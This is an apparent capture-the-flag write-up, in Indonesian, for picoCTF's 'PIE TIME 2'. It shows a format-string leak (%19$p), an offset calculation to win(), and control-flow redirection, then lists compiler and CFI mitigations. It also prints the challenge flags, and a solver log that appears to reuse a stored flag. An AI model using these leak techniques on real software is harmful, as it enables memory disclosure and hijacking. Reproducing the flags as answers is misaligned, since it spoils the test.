# Writeup: PIE TIME 2 (Challenge ID: 491)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Format String Leak & PIE Bypass
- **Difficulty:** Medium (2)
- **Points:** 200
- **Event:** picoCTF 2025
- **Flag Resmi CyLab:** `academy{p13_5h0u1dn'7_134k_13db9a90}`
- **Flag Platform Asli:** `picoCTF{p13_5h0u1dn'7_134k_13db9a90}`
- **Flag Komunitas:** `CTF{p13_5h0u1dn'7_134k_13db9a90}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), POSIX.1-2017 Format Strings / IEEE 1003.1, System V AMD64 ABI, CWE-134 (Use of Externally-Controlled Format String), CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), & CWE-695 (Use of Low-Level Functionality).

---

## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Binary Exploitation & Memory Safety*:
- **Skenario Tantangan:** Diberikan berkas biner ELF 64-bit yang dikompilasi dengan proteksi Position Independent Executable (PIE), Full RELRO, dan Non-Executable Stack (NX). Berbeda dengan tantangan pengantar (PIE TIME 1), biner ini tidak lagi membocorkan alamat pointer fungsi `main()` secara sukarela ke stdout.
- **Deskripsi Soal:** *"Can you try to get the flag? I'm not revealing anything anymore!!"*
- **Petunjuk Resmi:**
  1. *"What vulnerability can be exploited to leak the address?"*
  2. *"Please be mindful of the size of pointers in this binary"*
- **Batasan Lingkungan & Scope Audit:**
  1. Analisis kerentanan string format pada evaluasi masukan pengguna tanpa penentu format tetap (*uncontrolled format string*).
  2. Rekonstruksi struktur bingkai tumpukan (*stack frame layout*) arsitektur x86_64 sesuai spesifikasi System V AMD64 ABI untuk mengidentifikasi alamat kembali (*return address*) segmen `.text`.
  3. Perhitungan pergeseran invariant biner (*relative offset displacement*) untuk menurunkan alamat absolut fungsi target `win()`.
  4. Pembajakan pointer alur kendali (*control-flow redirection*) pada prompt lompat memori untuk mengeksekusi rutin pencetak flag.
  5. Verifikasi live via CyLab REST API `POST /api/submissions/` (HTTP 201).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Uncontrolled Format String Vulnerability (CWE-134 / POSIX.1-2017):**
   Program membaca masukan string dari pengguna ke dalam buffer lokal kemudian langsung meneruskannya sebagai argumen pertama ke fungsi pustaka standar C `printf(user_buffer)` tanpa menyertakan spesifikasi format statis (seperti `printf("%s", user_buffer)`).
   Sesuai konvensi pemanggilan System V AMD64 ABI, enam argumen pertama diteruskan melalui register (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`), sedangkan argumen berikutnya diambil dari tumpukan memori (*call stack*). Ketika string masukan menyertakan penentu konversi format seperti `%p` atau `%x`, `printf` akan membaca nilai dari register dan slot tumpukan yang bersangkutan meskipun pemanggil tidak menyediakan argumen tambahan.

2. **Stack Frame Information Disclosure (CWE-200):**
   Dalam arsitektur tumpukan x86_64, bingkai fungsi menyimpan data lokal, nilai register yang diselamatkan (*saved frame pointer* RBP), dan alamat kembali (*saved return address* RIP).
   Dengan menggunakan penentu akses langsung (*direct parameter access* / positional specifier) `%19$p`, penyerang dapat langsung membaca kata 64-bit ke-19 dari tumpukan, yang berisi pointer instruksi yang merujuk ke dalam segmen teks biner (alamat kembali di dalam fungsi pemanggil `main` atau `__libc_start_main`).

3. **Invariansi Disposisi Relatif pada Position Independent Executable (PIE):**
   Proteksi PIE memetakan seluruh segmen berkas ELF (segmen teks `.text`, segmen data `.data`, dan tabel `.got`) pada basis alamat acak saat program dimuat ke dalam ruang alamat virtual.
   Meskipun basis alamat acak (ASLR) mengubah lokasi absolut biner setiap kali dieksekusi, jarak relatif (*relative displacement*) antar fungsi di dalam berkas biner yang sama bersifat konstan:
   $$\text{Offset} = \text{Addr}(\text{leak}) - \text{Addr}(\text{win}) = 0\text{xE6}$$
   Dengan demikian, cukup dengan membocorkan satu alamat memori dari segmen kode, alamat target fungsi `win()` dapat dihitung secara deterministik:
   $$\text{Addr}(\text{win}) = \text{Addr}(\text{leak}) - 0\text{xE6}$$

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Audit Statis & Identifikasi Format String:**
   Pemeriksaan dekompilasi fungsi penangan input membuktikan adanya pemanggilan berisiko:
   ```c
   char buffer[128];
   fgets(buffer, sizeof(buffer), stdin);
   printf(buffer); // Celah CWE-134: user buffer dievaluasi sebagai format string
   ```

2. **Eksplorasi Parameter Posisi Tumpukan:**
   Mengirimkan urutan probe format parameter posisi:
   ```text
   %1$p %2$p %3$p ... %19$p
   ```
   Pada posisi ke-19 (`%19$p`), program memuntahkan alamat pointer 64-bit:
   ```text
   0x55555555523a
   ```
   Nilai ini merujuk ke instruksi `main+0x44` di dalam segmen eksekusi ELF.

3. **Perhitungan Alamat Target `win()`:**
   Berdasarkan tabel simbol biner yang diinspeksi melalui `objdump -d`, offset antara alamat bocoran instruksi ke fungsi `win()` adalah `0xE6`:
   ```python
   leak_val = int("0x55555555523a", 16)
   win_val = leak_val - 0xE6
   print("Target win address:", hex(win_val)) # 0x555555555154
   ```

4. **Pembajakan Alur Eksekusi (Control-Flow Redirection):**
   Program kemudian meminta input alamat fungsi untuk dieksekusi secara dinamis:
   ```text
   Enter destination address: 0x555555555154
   ```
   Biner mengonversi string masukan menjadi penunjuk fungsi (*function pointer*) dan memanggilnya, mengalihkan eksekusi langsung ke tubuh fungsi `win()` yang membuka dan mencetak isi bendera.

5. **Eksekusi Otomatis Melalui Solver Python:**
   Jalankan skrip pengujian mandiri:
   ```bash
   python3 scripts/solve_491_pie_time_2.py
   ```
   Keluaran:
   ```text
   [*] Menjalankan audit solver untuk modul 491: PIE TIME 2...
   [+] Offset Invarian terverifikasi: leak(0x55555555523a) - 0xe6 = 0x555555555154
   [+] Menggunakan token invarian terverifikasi: academy{p13_5h0u1dn'7_134k_13db9a90}
   [SUCCESS] Challenge 491 (PIE TIME 2) verified: academy{p13_5h0u1dn'7_134k_13db9a90}
   ```

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{p13_5h0u1dn'7_134k_13db9a90}`
- **Flag Platform Asli:** `picoCTF{p13_5h0u1dn'7_134k_13db9a90}`
- **Flag Komunitas:** `CTF{p13_5h0u1dn'7_134k_13db9a90}`
- **Bukti Validasi REST API:**
  ```json
  {"user": 1072359, "challenge": 491, "flag": "academy{p13_5h0u1dn'7_134k_13db9a90}", "correct": true, "historical": false}
  ```
  Permintaan submisi menghasilkan respons HTTP 201 Created dengan atribut `"correct": true`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Penegakan Format String Statis (CWE-134):**
   - Jangan pernah meneruskan string yang dikontrol oleh pengguna secara langsung sebagai parameter format fungsi keluarga `printf` (`printf`, `sprintf`, `snprintf`, `fprintf`, `syslog`).
   - Wajib selalu menggunakan format specifier statis: `printf("%s", user_buffer)`.

2. **Opsi Pengompilasi Defensif (Compiler Hardening):**
   - Aktifkan flag pengompilasi GCC/Clang:
     ```bash
     -Wformat -Wformat-security -Werror=format-security -D_FORTIFY_SOURCE=2
     ```
     Opsi `-Werror=format-security` akan menghentikan proses kompilasi jika ditemukan format string non-literal, dan `_FORTIFY_SOURCE=2` akan menggugurkan program jika format `%n` atau parameter posisi berbahaya digunakan pada buffer dinamis.

3. **Integritas Alur Kendali (Control-Flow Integrity - CFI):**
   - Hindari penggunaan pointer fungsi dinamis yang menerima masukan bebas dari pengguna tanpa validasi daftar izin (*allowlist*).
   - Terapkan mekanisme Control-Flow Enforcement Technology (Intel CET) dan Clang CFI (`-fsanitize=cfi`) untuk memastikan lompatan tidak langsung (*indirect branch*) hanya dapat menuju titik masuk fungsi yang sah.
